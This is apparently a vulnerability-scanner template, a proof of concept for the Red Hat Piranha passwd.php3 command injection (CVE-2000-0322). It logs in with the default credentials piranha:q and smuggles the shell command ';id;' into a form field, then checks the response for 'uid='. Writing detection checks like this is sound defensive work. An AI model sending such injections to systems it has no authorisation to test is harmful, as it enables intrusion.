[info]
author = "AVE"
description = "通过HTTP POST请求检测Red Hat Piranha Virtual Server Package中passwd.php3脚本的命令注入漏洞，利用默认凭据piranha:q进行基础认证后注入shell元字符验证命令执行"
id = "POC-AVE-2000-0267"
name = "Red Hat Piranha passwd.php3 Command Injection PoC"
severity = "critical"
tags = ["ave-2000-0267"]
vuln_id = [
    "CVE-2000-0322",
    "AVE-2000-0267",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/piranha/secure/passwd.php3"
protocol = "http"

[poc.requests.body]
content = "passwd=;id;&newpass=test&confirm=test"
type = "raw"

[poc.requests.headers]
Authorization = "Basic cGlyYW5oYTpx"
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
